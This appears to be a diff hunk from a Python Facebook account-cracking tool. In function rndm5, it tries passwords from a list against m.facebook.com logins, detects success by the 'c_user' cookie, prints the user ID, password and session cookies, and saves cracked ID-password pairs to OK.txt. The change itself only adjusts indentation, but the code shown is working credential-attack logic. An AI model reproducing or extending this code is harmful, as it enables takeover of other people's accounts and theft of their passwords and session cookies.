@@ -1445,7 +1445,7 @@ def rndm5(uid,passlist):
                         xnxx = ses.post(f"https://m.facebook.com{datax}", data=data, cookies=cookie, headers=head, allow_redirects=True)
                         fb_cookies=ses.cookies.get_dict().keys()
                         if 'c_user' in fb_cookies:
-				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+			        coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
 				uidx = coki[65:80]
 				print('\033[1;32m [AZIM-OK] '+uidx+'|'+pas+'|'+coki+'\033[0;97m')
 				open('OK.txt', 'a').write(uidx+'|'+pas+'\n')
